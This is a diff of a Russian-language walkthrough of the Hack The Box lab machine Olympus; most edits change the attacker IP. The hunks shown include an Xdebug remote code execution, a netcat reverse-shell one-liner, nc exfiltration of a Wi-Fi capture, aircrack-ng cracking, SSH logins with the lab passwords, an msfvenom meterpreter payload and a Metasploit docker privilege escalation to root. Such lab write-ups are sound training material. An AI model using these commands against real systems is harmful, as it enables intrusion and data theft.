@@ -15,7 +15,7 @@ comments: true
 ![olympus-banner.png]({{ "/img/htb/boxes/olympus/olympus-banner.png" | relative_url }})
 
 <h4 style="color:red;margin-bottom:0;">Olympus: 10.10.10.83</h4>
-<h4 style="color:red;">Attacker: 10.10.14.230</h4>
+<h4 style="color:red;">Attacker: 10.10.14.14</h4>
 
 * TOC
 {:toc}
@@ -151,7 +151,7 @@ root@kali:~# dig @10.10.10.83 olympus.htb
 И ничего больше...
 
 ## nikto
-Признаться, здесь я пробыл некоторое время... Пока не отработал `nikto` :smiling_imp:
+Признаться, здесь я пробыл некоторое время (изображение Зевса на стего-тулзы не откликается)... Пока не отработал `nikto` :smiling_imp:
 ```text
 root@kali:~# nikto -h http://10.10.10.83:80 -o nikto/olympus.txt
 - Nikto v2.1.6/2.1.5
@@ -230,7 +230,7 @@ root@kali:~# curl -H 'X-Forwarded-For: 10.10.13.180' 'http://10.10.10.83/index.p
 root@kali:~# python olympus_shell.py
 486<?xml version="1.0" encoding="iso-8859-1"?>
 <init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="17" idekey="phpstorm"><engine version="2.5.5"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
->> system('ping -c 2 10.10.14.230')
+>> system('ping -c 2 10.10.14.14')
 336<?xml version="1.0" encoding="iso-8859-1"?>
 <response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="61" encoding="base64"><![CDATA[cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA2OC4wMDEvNjguMzQ2LzY4LjY5MC8wLjM0NSBtcw==]]></property></response>
 ```
@@ -246,10 +246,10 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 ```
 
 ```text
-root@kali:~# curl -H 'X-Forwarded-For: 10.10.14.230' 'http://10.10.10.83/index.php?XDEBUG_SESSION_START=phpstorm'
-64 bytes from 10.10.14.230: icmp_seq=0 ttl=62 time=68.001 ms
-64 bytes from 10.10.14.230: icmp_seq=1 ttl=62 time=68.690 ms
---- 10.10.14.230 ping statistics ---
+root@kali:~# curl -H 'X-Forwarded-For: 10.10.14.14' 'http://10.10.10.83/index.php?XDEBUG_SESSION_START=phpstorm'
+64 bytes from 10.10.14.14: icmp_seq=0 ttl=62 time=68.001 ms
+64 bytes from 10.10.14.14: icmp_seq=1 ttl=62 time=68.690 ms
+--- 10.10.14.14 ping statistics ---
 2 packets transmitted, 2 packets received, 0% packet loss
 round-trip min/avg/max/stddev = 68.001/68.346/68.690/0.345 ms
 ```
@@ -270,7 +270,7 @@ round-trip min/avg/max/stddev = 68.001/68.346/68.690/0.345 ms
 Для получения сессии повторим операцию выше, только на этот раз в качестве пейлоада для Xdebug укажем bash-реверс-шелл:
 ```text
 ...
->> system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.230 31337 >/tmp/f')
+>> system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 31337 >/tmp/f')
 ...
 ```
 
@@ -339,7 +339,7 @@ captured.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, captur
 
 Забираем дамп трафика к себе на машину (вспоминая, как было бы удобно сделать это в один клик из-под meterpreter-сессии):
 ```text
-$ nc -w3 10.10.14.230 8888 < captured/captured.cap
+$ nc -w3 10.10.14.14 8888 < captured/captured.cap
 ```
 
 ```text
@@ -390,11 +390,13 @@ root@kali:~# aircrack-ng -e 'Too_cl0se_to_th3_Sun' -w /usr/share/wordlists/rocky
 ...
 ```
 
+На сей процесс на Kali-виртуалке ушло около получаса.
+
 Дальше "guessing" техникой или методологией "научного тыка в сферического коня в вакууме" определяем, что `icarus:Too_cl0se_to_th3_Sun` — креды для подключения к машине по 2222-му SSH порту (имя пользователя пришлось и вправду **угадывать**: как видишь, оказалось, что пароль от Wi-Fi'я лишь *содержал* имя пользователя, а не *являлся* им :neutral_face:).
 
 # SSH — Порт 2222
 ```text
-root@kali:~# sshpass -p 'Too_cl0se_to_th3_Sun' ssh -o StrictHostKeyChecking=no -p 2222 icarus@10.10.10.83
+root@kali:~# sshpass -p 'Too_cl0se_to_th3_Sun' ssh -oStrictHostKeyChecking=no -p 2222 icarus@10.10.10.83
 icarus@620b296204a3:~$ whoami
 icarus
 
@@ -476,7 +478,7 @@ ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolymp
 
 1\. С помощью специализированной утилиты [knock](https://github.com/jvinet/knock "jvinet/knock: A port-knocking daemon") (которую предварительно нужно установить, разумеется):
 ```text
-root@kali:~# knock 10.10.10.83 3456:tcp 8234:tcp 62431:tcp && sshpass -p 'St34l_th3_F1re!' ssh -o StrictHostKeyChecking=no prometheus@10.10.10.83
+root@kali:~# knock 10.10.10.83 3456:tcp 8234:tcp 62431:tcp && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83
 
 Welcome to
 
@@ -492,7 +494,7 @@ Welcome to
 
 2\. С помощью любимого nmap'а, указав "вежливую" скорость сканирования (`-T polite` == `-T 2`):
 ```text
-root@kali:~# nmap -n -v -Pn --host-timeout 251 --max-retries 0 -T polite -p3456,8234,62431 10.10.10.83 && sshpass -p 'St34l_th3_F1re!' ssh -o StrictHostKeyChecking=no prometheus@10.10.10.83
+root@kali:~# nmap -n -v -Pn --host-timeout 251 --max-retries 0 -T polite -p3456,8234,62431 10.10.10.83 && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:19 EDT
 Initiating SYN Stealth Scan at 11:19
 Scanning 10.10.10.83 [3 ports]
@@ -523,7 +525,7 @@ Welcome to
 
 3\. С помощью комбинации любимого nmap'а и пары директив шелл-скриптинга:
 ```text
-root@kali:~# for i in 3456 8234 62431; do nmap -n -v -Pn --host-timeout 251 --max-retries 0 -p $i 10.10.10.83 && sleep 1; done && sshpass -p 'St34l_th3_F1re!' ssh -o StrictHostKeyChecking=no prometheus@10.10.10.83
+root@kali:~# for i in 3456 8234 62431; do nmap -n -v -Pn --host-timeout 251 --max-retries 0 -p $i 10.10.10.83 && sleep 1; done && sshpass -p 'St34l_th3_F1re!' ssh -oStrictHostKeyChecking=no prometheus@10.10.10.83
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-03 11:20 EDT
 Initiating SYN Stealth Scan at 11:20
 Scanning 10.10.10.83 [1 port]
@@ -651,14 +653,14 @@ aba48699????????????????????????
 
 Испробуем на этой машине Metasploit-модуль для повышения привилегий в системах с доступом к docker'y. Для этого нам потребуется:
   * бэкдор;
-  * `exploit/multi/handler` (msf);
-  * `linux/local/docker_daemon_privilege_escalation` (msf).
+  * msf: `exploit/multi/handler`;
+  * msf: `linux/local/docker_daemon_privilege_escalation`.
 
 Для удобства я поднял ssh-master-соединение, а всякие бэкдоры перекидывал через ssh-slave, чтобы не простукивать порты каждый раз. Как настроить такое поведение SSH'а ("SSH Multiplexing") рассказывается, например, [здесь](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing#Setting_Up_Multiplexing "OpenSSH/Cookbook/Multiplexing - Wikibooks, open books for an open world").
 
 Крафтим бэкдор веномом:
 ```text
-root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.230 LPORT=4444 -f elf --platform linux -a x86 -o .sh3ll.elf
+root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f elf --platform linux -a x86 -o .sh3ll.elf
 No encoder or badchars specified, outputting raw payload
 Payload size: 123 bytes
 Final size of elf file: 207 bytes
@@ -685,7 +687,7 @@ Payload options (linux/x86/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  10.10.14.230      yes       The listen address (an interface may be specified)
+   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
    LPORT  4444              yes       The listen port
 
 
@@ -697,12 +699,12 @@ Exploit target:
 
 msf exploit(multi/handler) > run
 
-	[*] Started reverse TCP handler on 10.10.14.230:4444
+	[*] Started reverse TCP handler on 10.10.14.14:4444
 ```
 
 Активируем бэкдор на прометее и ловим сессию:
 ```text
-[*] Meterpreter session 1 opened (10.10.14.230:4444 -> 10.10.10.83:48154) at 2018-08-26 11:02:13 -0400
+[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.83:48154) at 2018-08-26 11:02:13 -0400
 ```
 
 ### root.txt
@@ -717,7 +719,7 @@ Active sessions
 
   Id  Name  Type                   Information                                             Connection
   --  ----  ----                   -----------                                             ----------
-  1         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 10.10.10.83  10.10.14.230:4444 -> 10.10.10.83:48154 (10.10.10.83)
+  1         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 10.10.10.83  10.10.14.14:4444 -> 10.10.10.83:48154 (10.10.10.83)
 
 msf exploit(multi/handler) > use exploit/linux/local/docker_daemon_privilege_escalation
 msf exploit(linux/local/docker_daemon_privilege_escalation) > show options
@@ -733,7 +735,7 @@ Payload options (linux/x86/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  10.10.14.230      yes       The listen address (an interface may be specified)
+   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
    LPORT  4444              yes       The listen port
 
 
@@ -745,12 +747,12 @@ Exploit target:
 
 msf exploit(linux/local/docker_daemon_privilege_escalation) > run
 
-[*] Started reverse TCP handler on 10.10.14.230:4444
+[*] Started reverse TCP handler on 10.10.14.14:4444
 [*] Writing payload executable to '/tmp/mfmDpJe'
 [*] Executing script to create and run docker container
 [*] Sending stage (861480 bytes) to 10.10.10.83
 [*] Waiting 60s for payload
-[*] Meterpreter session 3 opened (10.10.14.230:4444 -> 10.10.10.83:48162) at 2018-08-26 11:08:30 -0400
+[*] Meterpreter session 3 opened (10.10.14.14:4444 -> 10.10.10.83:48162) at 2018-08-26 11:08:30 -0400
 
 meterpreter > getuid
 Server username: uid=1000, gid=1000, euid=0, egid=1000
